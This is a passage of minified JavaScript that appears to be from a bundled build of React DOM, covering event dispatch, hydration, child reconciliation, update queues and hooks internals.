e;if((z||C)&&(C=A.window===A?A:(C=A.ownerDocument)?C.defaultView||C.parentWindow:window,z?(O=n.relatedTarget||n.toElement,z=_,O=O?an(O):null,O!==null&&(we=ln(O),O!==we||O.tag!==5&&O.tag!==6)&&(O=null)):(z=null,O=_),z!==O)){if($=ra,I="onMouseLeave",k="onMouseEnter",g="mouse",(e==="pointerout"||e==="pointerover")&&($=sa,I="onPointerLeave",k="onPointerEnter",g="pointer"),we=z==null?C:Nn(z),x=O==null?C:Nn(O),C=new $(I,g+"leave",z,n,A),C.target=we,C.relatedTarget=x,I=null,an(A)===_&&($=new $(k,g+"enter",O,n,A),$.target=x,$.relatedTarget=we,I=$),we=I,z&&O)t:{for($=z,k=O,g=0,x=$;x;x=jn(x))g++;for(x=0,I=k;I;I=jn(I))x++;for(;0<g-x;)$=jn($),g--;for(;0<x-g;)k=jn(k),x--;for(;g--;){if($===k||k!==null&&$===k.alternate)break t;$=jn($),k=jn(k)}$=null}else $=null;z!==null&&ja(R,C,z,$,!1),O!==null&&we!==null&&ja(R,we,O,$,!0)}}e:{if(C=_?Nn(_):window,z=C.nodeName&&C.nodeName.toLowerCase(),z==="select"||z==="input"&&C.type==="file")var F=Yd;else if(da(C))if(fa)F=ep;else{F=Zd;var B=Xd}else(z=C.nodeName)&&z.toLowerCase()==="input"&&(C.type==="checkbox"||C.type==="radio")&&(F=Jd);if(F&&(F=F(e,_))){pa(R,F,n,A);break e}B&&B(e,C,_),e==="focusout"&&(B=C._wrapperState)&&B.controlled&&C.type==="number"&&ls(C,"number",C.value)}switch(B=_?Nn(_):window,e){case"focusin":(da(B)||B.contentEditable==="true")&&(Rn=B,Ds=_,gr=null);break;case"focusout":gr=Ds=Rn=null;break;case"mousedown":Ms=!0;break;case"contextmenu":case"mouseup":case"dragend":Ms=!1,xa(R,n,A);break;case"selectionchange":if(rp)break;case"keydown":case"keyup":xa(R,n,A)}var U;if(js)e:{switch(e){case"compositionstart":var H="onCompositionStart";break e;case"compositionend":H="onCompositionEnd";break e;case"compositionupdate":H="onCompositionUpdate";break e}H=void 0}else An?ua(e,n)&&(H="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(H="onCompositionStart");H&&(oa&&n.locale!=="ko"&&(An||H!=="onCompositionStart"?H==="onCompositionEnd"&&An&&(U=ta()):(Wt=A,Ps="value"in Wt?Wt.value:Wt.textContent,An=!0)),B=ci(_,H),0<B.length&&(H=new ia(H,e,null,n,A),R.push({event:H,listeners:B}),U?H.data=U:(U=ca(n),U!==null&&(H.data=U)))),(U=qd?Vd(e,n):Qd(e,n))&&(_=ci(_,"onBeforeInput"),0<_.length&&(A=new ia("onBeforeInput","beforeinput",null,n,A),R.push({event:A,listeners:_}),A.data=U))}Ra(R,t)})}function kr(e,t,n){return{instance:e,listener:t,currentTarget:n}}function ci(e,t){for(var n=t+"Capture",r=[];e!==null;){var i=e,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=er(e,n),s!=null&&r.unshift(kr(e,s,i)),s=er(e,t),s!=null&&r.push(kr(e,s,i))),e=e.return}return r}function jn(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function ja(e,t,n,r,i){for(var s=t._reactName,u=[];n!==null&&n!==r;){var p=n,f=p.alternate,_=p.stateNode;if(f!==null&&f===r)break;p.tag===5&&_!==null&&(p=_,i?(f=er(n,s),f!=null&&u.unshift(kr(n,f,p))):i||(f=er(n,s),f!=null&&u.push(kr(n,f,p)))),n=n.return}u.length!==0&&e.push({event:t,listeners:u})}var lp=/\r\n?/g,ap=/\u0000|\uFFFD/g;function La(e){return(typeof e=="string"?e:""+e).replace(lp,`
`).replace(ap,"")}function di(e,t,n){if(t=La(t),La(e)!==t&&n)throw Error(l(425))}function pi(){}var Ws=null,Hs=null;function qs(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Vs=typeof setTimeout=="function"?setTimeout:void 0,up=typeof clearTimeout=="function"?clearTimeout:void 0,Na=typeof Promise=="function"?Promise:void 0,cp=typeof queueMicrotask=="function"?queueMicrotask:typeof Na<"u"?function(e){return Na.resolve(null).then(e).catch(dp)}:Vs;function dp(e){setTimeout(function(){throw e})}function Qs(e,t){var n=t,r=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&i.nodeType===8)if(n=i.data,n==="/$"){if(r===0){e.removeChild(i),ur(t);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=i}while(n);ur(t)}function qt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function za(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var Ln=Math.random().toString(36).slice(2),St="__reactFiber$"+Ln,wr="__reactProps$"+Ln,At="__reactContainer$"+Ln,Ks="__reactEvents$"+Ln,pp="__reactListeners$"+Ln,fp="__reactHandles$"+Ln;function an(e){var t=e[St];if(t)return t;for(var n=e.parentNode;n;){if(t=n[At]||n[St]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=za(e);e!==null;){if(n=e[St])return n;e=za(e)}return t}e=n,n=e.parentNode}return null}function xr(e){return e=e[St]||e[At],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Nn(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(l(33))}function fi(e){return e[wr]||null}var Gs=[],zn=-1;function Vt(e){return{current:e}}function ce(e){0>zn||(e.current=Gs[zn],Gs[zn]=null,zn--)}function ae(e,t){zn++,Gs[zn]=e.current,e.current=t}var Qt={},Re=Vt(Qt),Be=Vt(!1),un=Qt;function Dn(e,t){var n=e.type.contextTypes;if(!n)return Qt;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in n)i[s]=t[s];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=i),i}function Ue(e){return e=e.childContextTypes,e!=null}function hi(){ce(Be),ce(Re)}function Da(e,t,n){if(Re.current!==Qt)throw Error(l(168));ae(Re,t),ae(Be,n)}function Ma(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var i in r)if(!(i in t))throw Error(l(108,le(e)||"Unknown",i));return M({},n,r)}function mi(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Qt,un=Re.current,ae(Re,e),ae(Be,Be.current),!0}function Oa(e,t,n){var r=e.stateNode;if(!r)throw Error(l(169));n?(e=Ma(e,t,un),r.__reactInternalMemoizedMergedChildContext=e,ce(Be),ce(Re),ae(Re,e)):ce(Be),ae(Be,n)}var Rt=null,gi=!1,Ys=!1;function $a(e){Rt===null?Rt=[e]:Rt.push(e)}function hp(e){gi=!0,$a(e)}function Kt(){if(!Ys&&Rt!==null){Ys=!0;var e=0,t=re;try{var n=Rt;for(re=1;e<n.length;e++){var r=n[e];do r=r(!0);while(r!==null)}Rt=null,gi=!1}catch(i){throw Rt!==null&&(Rt=Rt.slice(e+1)),Bl(vs,Kt),i}finally{re=t,Ys=!1}}return null}var Mn=[],On=0,yi=null,vi=0,nt=[],rt=0,cn=null,It=1,jt="";function dn(e,t){Mn[On++]=vi,Mn[On++]=yi,yi=e,vi=t}function Fa(e,t,n){nt[rt++]=It,nt[rt++]=jt,nt[rt++]=cn,cn=e;var r=It;e=jt;var i=32-ct(r)-1;r&=~(1<<i),n+=1;var s=32-ct(t)+i;if(30<s){var u=i-i%5;s=(r&(1<<u)-1).toString(32),r>>=u,i-=u,It=1<<32-ct(t)+i|n<<i|r,jt=s+e}else It=1<<s|n<<i|r,jt=e}function Xs(e){e.return!==null&&(dn(e,1),Fa(e,1,0))}function Zs(e){for(;e===yi;)yi=Mn[--On],Mn[On]=null,vi=Mn[--On],Mn[On]=null;for(;e===cn;)cn=nt[--rt],nt[rt]=null,jt=nt[--rt],nt[rt]=null,It=nt[--rt],nt[rt]=null}var Ze=null,Je=null,pe=!1,pt=null;function Ba(e,t){var n=lt(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function Ua(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,Ze=e,Je=qt(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,Ze=e,Je=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=cn!==null?{id:It,overflow:jt}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=lt(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,Ze=e,Je=null,!0):!1;default:return!1}}function Js(e){return(e.mode&1)!==0&&(e.flags&128)===0}function eo(e){if(pe){var t=Je;if(t){var n=t;if(!Ua(e,t)){if(Js(e))throw Error(l(418));t=qt(n.nextSibling);var r=Ze;t&&Ua(e,t)?Ba(r,n):(e.flags=e.flags&-4097|2,pe=!1,Ze=e)}}else{if(Js(e))throw Error(l(418));e.flags=e.flags&-4097|2,pe=!1,Ze=e}}}function Wa(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ze=e}function ki(e){if(e!==Ze)return!1;if(!pe)return Wa(e),pe=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!qs(e.type,e.memoizedProps)),t&&(t=Je)){if(Js(e))throw Ha(),Error(l(418));for(;t;)Ba(e,t),t=qt(t.nextSibling)}if(Wa(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(l(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){Je=qt(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}Je=null}}else Je=Ze?qt(e.stateNode.nextSibling):null;return!0}function Ha(){for(var e=Je;e;)e=qt(e.nextSibling)}function $n(){Je=Ze=null,pe=!1}function to(e){pt===null?pt=[e]:pt.push(e)}var mp=Ee.ReactCurrentBatchConfig;function Sr(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(l(309));var r=n.stateNode}if(!r)throw Error(l(147,e));var i=r,s=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===s?t.ref:(t=function(u){var p=i.refs;u===null?delete p[s]:p[s]=u},t._stringRef=s,t)}if(typeof e!="string")throw Error(l(284));if(!n._owner)throw Error(l(290,e))}return e}function wi(e,t){throw e=Object.prototype.toString.call(t),Error(l(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function qa(e){var t=e._init;return t(e._payload)}function Va(e){function t(k,g){if(e){var x=k.deletions;x===null?(k.deletions=[g],k.flags|=16):x.push(g)}}function n(k,g){if(!e)return null;for(;g!==null;)t(k,g),g=g.sibling;return null}function r(k,g){for(k=new Map;g!==null;)g.key!==null?k.set(g.key,g):k.set(g.index,g),g=g.sibling;return k}function i(k,g){return k=nn(k,g),k.index=0,k.sibling=null,k}function s(k,g,x){return k.index=x,e?(x=k.alternate,x!==null?(x=x.index,x<g?(k.flags|=2,g):x):(k.flags|=2,g)):(k.flags|=1048576,g)}function u(k){return e&&k.alternate===null&&(k.flags|=2),k}function p(k,g,x,I){return g===null||g.tag!==6?(g=Qo(x,k.mode,I),g.return=k,g):(g=i(g,x),g.return=k,g)}function f(k,g,x,I){var F=x.type;return F===$e?A(k,g,x.props.children,I,x.key):g!==null&&(g.elementType===F||typeof F=="object"&&F!==null&&F.$$typeof===Fe&&qa(F)===g.type)?(I=i(g,x.props),I.ref=Sr(k,g,x),I.return=k,I):(I=Hi(x.type,x.key,x.props,null,k.mode,I),I.ref=Sr(k,g,x),I.return=k,I)}function _(k,g,x,I){return g===null||g.tag!==4||g.stateNode.containerInfo!==x.containerInfo||g.stateNode.implementation!==x.implementation?(g=Ko(x,k.mode,I),g.return=k,g):(g=i(g,x.children||[]),g.return=k,g)}function A(k,g,x,I,F){return g===null||g.tag!==7?(g=kn(x,k.mode,I,F),g.return=k,g):(g=i(g,x),g.return=k,g)}function R(k,g,x){if(typeof g=="string"&&g!==""||typeof g=="number")return g=Qo(""+g,k.mode,x),g.return=k,g;if(typeof g=="object"&&g!==null){switch(g.$$typeof){case ze:return x=Hi(g.type,g.key,g.props,null,k.mode,x),x.ref=Sr(k,null,g),x.return=k,x;case ve:return g=Ko(g,k.mode,x),g.return=k,g;case Fe:var I=g._init;return R(k,I(g._payload),x)}if(Xn(g)||W(g))return g=kn(g,k.mode,x,null),g.return=k,g;wi(k,g)}return null}function C(k,g,x,I){var F=g!==null?g.key:null;if(typeof x=="string"&&x!==""||typeof x=="number")return F!==null?null:p(k,g,""+x,I);if(typeof x=="object"&&x!==null){switch(x.$$typeof){case ze:return x.key===F?f(k,g,x,I):null;case ve:return x.key===F?_(k,g,x,I):null;case Fe:return F=x._init,C(k,g,F(x._payload),I)}if(Xn(x)||W(x))return F!==null?null:A(k,g,x,I,null);wi(k,x)}return null}function z(k,g,x,I,F){if(typeof I=="string"&&I!==""||typeof I=="number")return k=k.get(x)||null,p(g,k,""+I,F);if(typeof I=="object"&&I!==null){switch(I.$$typeof){case ze:return k=k.get(I.key===null?x:I.key)||null,f(g,k,I,F);case ve:return k=k.get(I.key===null?x:I.key)||null,_(g,k,I,F);case Fe:var B=I._init;return z(k,g,x,B(I._payload),F)}if(Xn(I)||W(I))return k=k.get(x)||null,A(g,k,I,F,null);wi(g,I)}return null}function O(k,g,x,I){for(var F=null,B=null,U=g,H=g=0,Ce=null;U!==null&&H<x.length;H++){U.index>H?(Ce=U,U=null):Ce=U.sibling;var te=C(k,U,x[H],I);if(te===null){U===null&&(U=Ce);break}e&&U&&te.alternate===null&&t(k,U),g=s(te,g,H),B===null?F=te:B.sibling=te,B=te,U=Ce}if(H===x.length)return n(k,U),pe&&dn(k,H),F;if(U===null){for(;H<x.length;H++)U=R(k,x[H],I),U!==null&&(g=s(U,g,H),B===null?F=U:B.sibling=U,B=U);return pe&&dn(k,H),F}for(U=r(k,U);H<x.length;H++)Ce=z(U,k,H,x[H],I),Ce!==null&&(e&&Ce.alternate!==null&&U.delete(Ce.key===null?H:Ce.key),g=s(Ce,g,H),B===null?F=Ce:B.sibling=Ce,B=Ce);return e&&U.forEach(function(rn){return t(k,rn)}),pe&&dn(k,H),F}function $(k,g,x,I){var F=W(x);if(typeof F!="function")throw Error(l(150));if(x=F.call(x),x==null)throw Error(l(151));for(var B=F=null,U=g,H=g=0,Ce=null,te=x.next();U!==null&&!te.done;H++,te=x.next()){U.index>H?(Ce=U,U=null):Ce=U.sibling;var rn=C(k,U,te.value,I);if(rn===null){U===null&&(U=Ce);break}e&&U&&rn.alternate===null&&t(k,U),g=s(rn,g,H),B===null?F=rn:B.sibling=rn,B=rn,U=Ce}if(te.done)return n(k,U),pe&&dn(k,H),F;if(U===null){for(;!te.done;H++,te=x.next())te=R(k,te.value,I),te!==null&&(g=s(te,g,H),B===null?F=te:B.sibling=te,B=te);return pe&&dn(k,H),F}for(U=r(k,U);!te.done;H++,te=x.next())te=z(U,k,H,te.value,I),te!==null&&(e&&te.alternate!==null&&U.delete(te.key===null?H:te.key),g=s(te,g,H),B===null?F=te:B.sibling=te,B=te);return e&&U.forEach(function(Kp){return t(k,Kp)}),pe&&dn(k,H),F}function we(k,g,x,I){if(typeof x=="object"&&x!==null&&x.type===$e&&x.key===null&&(x=x.props.children),typeof x=="object"&&x!==null){switch(x.$$typeof){case ze:e:{for(var F=x.key,B=g;B!==null;){if(B.key===F){if(F=x.type,F===$e){if(B.tag===7){n(k,B.sibling),g=i(B,x.props.children),g.return=k,k=g;break e}}else if(B.elementType===F||typeof F=="object"&&F!==null&&F.$$typeof===Fe&&qa(F)===B.type){n(k,B.sibling),g=i(B,x.props),g.ref=Sr(k,B,x),g.return=k,k=g;break e}n(k,B);break}else t(k,B);B=B.sibling}x.type===$e?(g=kn(x.props.children,k.mode,I,x.key),g.return=k,k=g):(I=Hi(x.type,x.key,x.props,null,k.mode,I),I.ref=Sr(k,g,x),I.return=k,k=I)}return u(k);case ve:e:{for(B=x.key;g!==null;){if(g.key===B)if(g.tag===4&&g.stateNode.containerInfo===x.containerInfo&&g.stateNode.implementation===x.implementation){n(k,g.sibling),g=i(g,x.children||[]),g.return=k,k=g;break e}else{n(k,g);break}else t(k,g);g=g.sibling}g=Ko(x,k.mode,I),g.return=k,k=g}return u(k);case Fe:return B=x._init,we(k,g,B(x._payload),I)}if(Xn(x))return O(k,g,x,I);if(W(x))return $(k,g,x,I);wi(k,x)}return typeof x=="string"&&x!==""||typeof x=="number"?(x=""+x,g!==null&&g.tag===6?(n(k,g.sibling),g=i(g,x),g.return=k,k=g):(n(k,g),g=Qo(x,k.mode,I),g.return=k,k=g),u(k)):n(k,g)}return we}var Fn=Va(!0),Qa=Va(!1),xi=Vt(null),Si=null,Bn=null,no=null;function ro(){no=Bn=Si=null}function io(e){var t=xi.current;ce(xi),e._currentValue=t}function so(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,r!==null&&(r.childLanes|=t)):r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Un(e,t){Si=e,no=Bn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&((e.lanes&t)!==0&&(We=!0),e.firstContext=null)}function it(e){var t=e._currentValue;if(no!==e)if(e={context:e,memoizedValue:t,next:null},Bn===null){if(Si===null)throw Error(l(308));Bn=e,Si.dependencies={lanes:0,firstContext:e}}else Bn=Bn.next=e;return t}var pn=null;function oo(e){pn===null?pn=[e]:pn.push(e)}function Ka(e,t,n,r){var i=t.interleaved;return i===null?(n.next=n,oo(t)):(n.next=i.next,i.next=n),t.interleaved=n,Lt(e,r)}function Lt(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var Gt=!1;function lo(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Ga(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Nt(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function Yt(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,(Z&2)!==0){var i=r.pending;return i===null?t.next=t:(t.next=i.next,i.next=t),r.pending=t,Lt(e,n)}return i=r.interleaved,i===null?(t.next=t,oo(r)):(t.next=i.next,i.next=t),r.interleaved=t,Lt(e,n)}function _i(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,xs(e,n)}}function Ya(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,s=null;if(n=n.firstBaseUpdate,n!==null){do{var u={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};s===null?i=s=u:s=s.next=u,n=n.next}while(n!==null);s===null?i=s=t:s=s.next=t}else i=s=t;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Ei(e,t,n,r){var i=e.updateQueue;Gt=!1;var s=i.firstBaseUpdate,u=i.lastBaseUpdate,p=i.shared.pending;if(p!==null){i.shared.pending=null;var f=p,_=f.next;f.next=null,u===null?s=_:u.next=_,u=f;var A=e.alternate;A!==null&&(A=A.updateQueue,p=A.lastBaseUpdate,p!==u&&(p===null?A.firstBaseUpdate=_:p.next=_,A.lastBaseUpdate=f))}if(s!==null){var R=i.baseState;u=0,A=_=f=null,p=s;do{var C=p.lane,z=p.eventTime;if((r&C)===C){A!==null&&(A=A.next={eventTime:z,lane:0,tag:p.tag,payload:p.payload,callback:p.callback,next:null});e:{var O=e,$=p;switch(C=t,z=n,$.tag){case 1:if(O=$.payload,typeof O=="function"){R=O.call(z,R,C);break e}R=O;break e;case 3:O.flags=O.flags&-65537|128;case 0:if(O=$.payload,C=typeof O=="function"?O.call(z,R,C):O,C==null)break e;R=M({},R,C);break e;case 2:Gt=!0}}p.callback!==null&&p.lane!==0&&(e.flags|=64,C=i.effects,C===null?i.effects=[p]:C.push(p))}else z={eventTime:z,lane:C,tag:p.tag,payload:p.payload,callback:p.callback,next:null},A===null?(_=A=z,f=R):A=A.next=z,u|=C;if(p=p.next,p===null){if(p=i.shared.pending,p===null)break;C=p,p=C.next,C.next=null,i.lastBaseUpdate=C,i.shared.pending=null}}while(!0);if(A===null&&(f=R),i.baseState=f,i.firstBaseUpdate=_,i.lastBaseUpdate=A,t=i.shared.interleaved,t!==null){i=t;do u|=i.lane,i=i.next;while(i!==t)}else s===null&&(i.shared.lanes=0);mn|=u,e.lanes=u,e.memoizedState=R}}function Xa(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var r=e[t],i=r.callback;if(i!==null){if(r.callback=null,r=n,typeof i!="function")throw Error(l(191,i));i.call(r)}}}var _r={},_t=Vt(_r),Er=Vt(_r),Tr=Vt(_r);function fn(e){if(e===_r)throw Error(l(174));return e}function ao(e,t){switch(ae(Tr,t),ae(Er,e),ae(_t,_r),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:us(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=us(t,e)}ce(_t),ae(_t,t)}function Wn(){ce(_t),ce(Er),ce(Tr)}function Za(e){fn(Tr.current);var t=fn(_t.current),n=us(t,e.type);t!==n&&(ae(Er,e),ae(_t,n))}function uo(e){Er.current===e&&(ce(_t),ce(Er))}var fe=Vt(0);function Ti(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var co=[];function po(){for(var e=0;e<co.length;e++)co[e]._workInProgressVersionPrimary=null;co.length=0}var Pi=Ee.ReactCurrentDispatcher,fo=Ee.ReactCurrentBatchConfig,hn=0,he=null,Se=null,Te=null,Ci=!1,Pr=!1,Cr=0,gp=0;function Ie(){throw Error(l(321))}function ho(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!dt(e[n],t[n]))return!1;return!0}function mo(e,t,n,r,i,s){if(hn=s,he=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Pi.current=e===null||e.memoizedState===null?wp:xp,e=n(r,i),Pr){s=0;do{if(Pr=!1,Cr=0,25<=s)throw Error(l(301));s+=1,Te=Se=null,t.updateQueue=null,Pi.current=Sp,e=n(r,i)}while(Pr)}if(Pi.current=Ri,t=Se!==null&&Se.next!==null,hn=0,Te=Se=he=null,Ci=!1,t)throw Error(l(300));return e}function go(){var e=Cr!==0;return Cr=0,e}function Et(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Te===null?he.memoizedState=Te=e:Te=Te.next=e,Te}function st(){if(Se===null){var e=he.alternate;e=e!==null?e.memoizedState:null}else e=Se.next;var t=Te===null?he.memoizedState:Te.next;if(t!==null)Te=t,Se=e;else{if(e===null)throw Error(l(310));Se=e,e={memoizedState:Se.memoizedState,baseState:Se.baseState,baseQueue:Se.baseQueue,queue:Se.queue,next:null},Te===null?he.memoizedState=Te=e:Te=Te.next=e}return Te}function br(e,t){return typeof t=="function"?t(e):t}function yo(e){var t=st(),n=t.queue;if(n===null)throw Error(l(311));n.lastRenderedReducer=e;var r=Se,i=r.baseQueue,s=n.pending;if(s!==null){if(i!==null){var u=i.next;i.next=s.next,s.next=u}r.baseQueue=i=s,n.pending=null}if(i!==null){s=i.next,r=r.baseState;var p=u=null,f=null,_=s;do{var A=_.lane;if((hn&A)===A)f!==null&&(f=f.next={lane:0,action:_.action,hasEagerState:_.hasEagerState,eagerState:_.eagerState,next:null}),r=_.hasEagerState?_.eagerState:e(r,_.action);else{var R={lane:A,action:_.action,hasEagerState:_.hasEagerState,eagerState:_.eagerState,next:null};f===null?(p=f=R,u=r):f=f.next=R,he.lanes|=A,mn|=A}_=_.next}while(_!==null&&_!==s);f===null?u=r:f.next=p,dt(r,t.memoizedState)||(We=!0),t.memoizedState=r,t.baseState=u,t.baseQueue=f,n.lastRenderedState=r}if(e=n.interleaved,e!==null){i=e;do s=i.lane,he.lanes|=s,mn|=s,i=i.next;while(i!==e)}else i===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function vo(e){var t=st(),n=t.queue;if(n===null)throw Error(l(311));n.lastRenderedReducer=e;var r=n.dispatch,i=n.pending,s=t.memoizedState;if(i!==null){n.pending=null;var u=i=i.next;do s=e(s,u.action),u=u.next;while(u!==i);dt(s,t.memoizedState)||(We=!0),t.memoizedState=s,t.baseQueue===null&&(t.baseState=s),n.lastRenderedState=s}return[s,r]}function Ja(){}function eu(e,t){var n=he,r=st(),i=t(),s=!dt(r.memoizedState,i);if(s&&(r.memoizedState=i,We=!0),r=r.queue,ko(ru.bind(null,n,r,e),[e]),r.getSnapshot!==t||s||Te!==null&&Te.memoizedState.tag&1){if(n.flags|=2048,Ar(9,nu.bind(null,n,r,i,t),void 0,null),Pe===null)throw Error(l(349));(hn&30)!==0||tu(n,t,i)}return i}function tu(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=he.updateQueue,t===null?(t={lastEffect:null,stores:null},he.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function nu(e,t,n,r){t.value=n,t.getSnapshot=r,iu(t)&&su(e)}function ru(e,t,n){return n(function(){iu(t)&&su(e)})}function iu(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!dt(e,n)}catch{return!0}}function su(e){var t=Lt(e,1);t!==null&&gt(t,e,1,-1)}function ou(e){var t=Et();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:br,lastRenderedState:e},t.queue=e,e=e.dispatch=kp.bind(null,he,e),[t.memoizedState,e]}function Ar(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},t=he.updateQueue,t===null?(t={lastEffect:null,stores:null},he.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e)),e}function lu(){return st().memoizedState}function bi(e,t,n,r){var i=Et();he.flags|=e,i.memoizedState=Ar(1|t,n,void 0,r===void 0?null:r)}function Ai(e,t,n,r){var i=st();r=r===void 0?null:r;var s=void 0;if(Se!==null){var u=Se.memoizedState;if(s=u.destroy,r!==null&&ho(r,u.deps)){i.memoizedState=Ar(t,n,s,r);return}}he.flags|=e,i.memoizedState=Ar(1|t,n,s,r)}function au(e,t){return bi(8390656,8,e,t)}function ko(e,t){return Ai(2048,8,e,t)}function uu(e,t){return Ai(4,2,e,t)}function cu(e,t){return Ai(4,4,e,t)}function du(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function pu(e,t,n){return n=n!=null?n.concat([e]):null,Ai(4,4,du.bind(null,t,e),n)}function wo(){}function fu(e,t){var n=st();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&ho(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function hu(e,t){var n=st();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&ho(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function mu(e,t,n){return(hn&21)===0?(e.baseState&&(e.baseState=!1,We=!0),e.memoizedState=n):(dt(n,t)||(n=ql(),he.lanes|=n,mn|=n,e.baseState=!0),t)}function yp(e,t){var n=re;re=n!==0&&4>n?n:4,e(!0);var r=fo.transition;fo.transition={};try{e(!1),t()}finally{re=n,fo.transition=r}}function gu(){return st().memoizedState}function vp(e,t,n){var r=en(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},yu(e))vu(t,n);else if(n=Ka(e,t,n,r),n!==null){var i=Me();gt(n,e,r,i),ku(n,t,r)}}function kp(e,t,n){var r=en(e),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(yu(e))vu(t,i);else{var 